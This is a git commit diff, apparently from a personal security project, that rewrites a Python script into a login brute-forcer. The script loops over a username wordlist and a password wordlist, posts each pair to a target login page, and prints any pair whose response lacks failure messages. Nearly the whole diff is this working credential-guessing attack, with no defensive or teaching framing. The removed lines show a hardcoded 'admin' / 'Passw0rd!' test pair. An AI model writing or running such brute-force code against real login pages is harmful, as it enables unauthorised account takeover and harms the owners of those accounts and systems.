548685bbeb4196baa978b818ca54db804b99d930
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-09-09 05:05:36 -0400

    Final0

--- trylog.py
+++ trylog.py
@@ -2,8 +2,19 @@
 import requests
 
 traget_page = "[URL in action]"
+try_data= {"username":"", "password":"", "login":"submit"}
 
-try_data= {"username":"admin", "password":"Passw0rd!", "login":"submit"}
+with open("uname.txt", "r") as unamefile:
+    for line in unamefile:
+        name = line.strip()
+        try_data["username"] = name
+        with open("passwd.txt", "r") as passfile:
+            for txt in passfile:
+                passd = txt.strip()
+                try_data["password"] = passd
+                resp = requests.post(traget_page, data=try_data)
+                if "Login failed" not in resp.content and "Incorrect" not in resp.content:
+                    print("[+] Credential found --> USERNAME:" + name + "\tPASSWORD:" + passd)
+                    exit()
 
-resp = requests.post(traget_page, data=try_data)
-print(reps.content)
+print("[-] Unable to find Credentials, Upgrade your wordlist.")
